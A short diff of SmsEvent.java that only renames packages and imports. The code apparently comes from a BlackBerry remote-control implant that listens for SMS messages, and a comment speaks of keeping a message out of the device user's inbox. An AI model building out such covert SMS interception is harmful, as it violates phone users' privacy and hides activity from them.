@@ -5,7 +5,7 @@
  * File         : SmsEvent.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.event;
+package blackberry.event;
 
 import java.io.IOException;
 import java.io.InterruptedIOException;
@@ -19,8 +19,8 @@ import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.MessageListener;
 import javax.wireless.messaging.TextMessage;
 
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 /**
  * To prevent this message from appearing in the BlackBerry device user’s inbox,
